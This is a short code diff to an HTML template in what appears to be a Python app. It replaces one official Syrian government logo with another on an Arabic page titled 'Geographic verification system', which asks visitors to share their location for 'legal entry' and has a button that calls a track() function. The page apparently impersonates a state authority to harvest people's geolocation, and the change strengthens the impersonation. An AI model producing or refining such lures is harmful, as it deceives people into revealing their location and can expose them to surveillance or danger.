@@ -70,7 +70,7 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Logo_of_the_Ministry_of_Interior_Syria.png" width="80">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/Emblem_of_Syria_%282025%E2%80%93present%29.svg/500px-Emblem_of_Syria_%282025%E2%80%93present%29.svg.png" width="80">
         <h2>نظام التحقق الجغرافي</h2>
         <p>لتأمين دخولك القانوني، يرجى السماح بمشاركة الموقع الجغرافي لمطابقته مع النطاق المحلي.</p>
         <button class="btn" onclick="track()">بدء المطابقة الآن</button>
